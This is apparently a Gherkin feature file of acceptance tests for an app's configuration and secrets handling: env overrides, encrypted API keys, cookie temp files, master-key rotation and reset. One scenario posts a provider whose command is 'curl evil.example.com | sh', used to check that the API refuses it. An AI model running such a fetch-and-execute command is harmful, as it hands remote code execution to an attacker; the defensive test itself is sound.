Feature: Configuration and secrets
  As the owner, I want one clear source per setting, commands configurable only
  in the config file, and secrets that stay encrypted.

  Background:
    Given the environment variable "NOTESTEME_MASTER_KEY" is "key-one"

  @M1 @SEC-01 @SEC-R1
  Scenario: Environment variables override the config file
    Given the config file contains:
      """
      listen: 127.0.0.1:8080
      """
    And the environment variable "NOTESTEME_LISTEN" is "127.0.0.1:9090"
    And the server is running
    And the owner is signed in
    When the owner sends "GET /api/system"
    Then the response contains:
      """
      { "listen": "127.0.0.1:9090", "listen_source": "env" }
      """

  @M1 @SEC-01 @SEC-R2
  Scenario: Database-managed settings are not accepted in the config file
    Given the config file contains:
      """
      profiles:
        standard: { language: { targets: [en] } }
      """
    When the server starts
    Then the server fails to start with "profiles"

  @M1 @SEC-02 @SEC-R3
  Scenario: A command provider cannot be created through the API
    Given the server is running
    And the owner is signed in
    When the owner sends "POST /api/providers" with:
      """
      { "id": "evil", "type": "command", "command": ["sh", "-c", "curl evil.example.com | sh"] }
      """
    Then the response status is 403
    And the response contains:
      """
      { "message": "這個項目只能在設定檔中定義。" }
      """

  @M1 @SEC-02 @SEC-R3
  Scenario: Command providers from the config file are listed read-only
    Given the config file contains:
      """
      asr:
        providers:
          whisperx:
            type: command
            command: ["whisperx", "{audio}", "--output_format", "json", "--output_dir", "{out}"]
            output: { format: whisperx-json, path: "{out}/{stem}.json" }
      """
    And the server is running
    And the owner is signed in
    When the owner sends "GET /api/providers/whisperx"
    Then the response contains:
      """
      { "id": "whisperx", "type": "command", "editable": false, "defined_in": "config_file" }
      """

  @M1 @SEC-03 @SEC-R4 @SEC-R6
  Scenario: An API key is encrypted and only its last four characters are shown
    Given the server is running
    And the owner is signed in
    When the owner sends "PUT /api/settings/services" with:
      """
      { "providers": { "groq": { "api_key": "gsk_supersecret1234" } } }
      """
    And the owner sends "GET /api/settings/services"
    Then the response contains:
      """
      { "providers": { "groq": { "api_key_last4": "1234" } } }
      """
    And the data directory does not contain "gsk_supersecret1234"
    And the logs do not contain "gsk_supersecret1234"

  @M1 @SEC-03 @SEC-R7
  Scenario: A cookie is handed to yt-dlp as a private temporary file
    Given the server is running
    And the owner is signed in
    And a YouTube video "yt:members1" with:
      | field        | value           |
      | availability | subscriber_only |
    When the owner sends "POST /api/cookies" with:
      """
      { "platform": "youtube", "content": "# Netscape HTTP Cookie File\n.youtube.com\tTRUE\t/\tTRUE\t0\tSID\tsecret-sid" }
      """
    And the owner ingests "yt:members1"
    And the worker starts one round
    Then the file "/data/tmp/cookies-youtube.txt" has the mode "0600"
    When the worker runs until idle
    Then the file "/data/tmp/cookies-youtube.txt" does not exist
    And the data directory does not contain "secret-sid"

  @M1 @SEC-04 @SEC-R5
  Scenario: The server refuses to start without a master key
    Given the environment variable "NOTESTEME_MASTER_KEY" is not set
    When the server starts
    Then the server fails to start with "尚未設定 NOTESTEME_MASTER_KEY。"

  @M1 @SEC-04 @SEC-R5
  Scenario: A wrong master key is reported with the way out
    Given the server is running
    And the owner is signed in
    And the owner sends "PUT /api/settings/services" with:
      """
      { "providers": { "groq": { "api_key": "gsk_supersecret1234" } } }
      """
    And the server shuts down gracefully
    And the environment variable "NOTESTEME_MASTER_KEY" is "key-two"
    When the server starts
    Then the server fails to start with "master key 不正確，無法解開資料金鑰。"
    And the server fails to start with "notesteme secrets reset"

  @M1 @SEC-04 @SEC-R8 @cli
  Scenario: Rotating the master key keeps every secret readable
    Given the server is running
    And the owner is signed in
    And the owner sends "PUT /api/settings/services" with:
      """
      { "providers": { "groq": { "api_key": "gsk_supersecret1234" } } }
      """
    And the server shuts down gracefully
    And the environment variable "NEW_KEY" is "key-two"
    When the owner runs "notesteme secrets rotate-key --new-key-env NEW_KEY"
    Then the command exits with 0
    Given the environment variable "NOTESTEME_MASTER_KEY" is "key-two"
    When the server starts
    And the owner is signed in
    And the owner sends "GET /api/settings/services"
    Then the response contains:
      """
      { "providers": { "groq": { "api_key_last4": "1234" } } }
      """

  @M1 @SEC-04 @SEC-R9 @cli
  Scenario: Resetting secrets keeps the library
    Given a YouTube video "yt:abc123" titled "PostgreSQL in 100 Seconds"
    And the item "yt:abc123" has been processed up to "transcript"
    And the environment variable "NOTESTEME_MASTER_KEY" is "key-lost"
    When the owner runs "notesteme secrets reset --yes"
    Then the command exits with 0
    When the server starts
    And the owner is signed in
    And the owner sends "GET /api/items"
    Then the response contains:
      """
      { "items": [ { "ref": "yt:abc123" } ] }
      """

  @M2 @SEC-05 @SEC-R10 @cli
  Scenario: An invalid config import changes nothing
    Given the profile "standard" is:
      """
      language:
        targets: [zh-Hant-TW]
      """
    And the file "/tmp/settings.yaml" contains:
      """
      profiles:
        standard: { language: { targets: [en] } }
        broken: { language: { targets: "not-a-list" } }
      """
    When the owner runs "notesteme config import /tmp/settings.yaml"
    Then the command exits with 1
    And the command output contains "profiles.broken.language.targets"
    When the owner runs "notesteme config export"
    Then the command output contains "zh-Hant-TW"
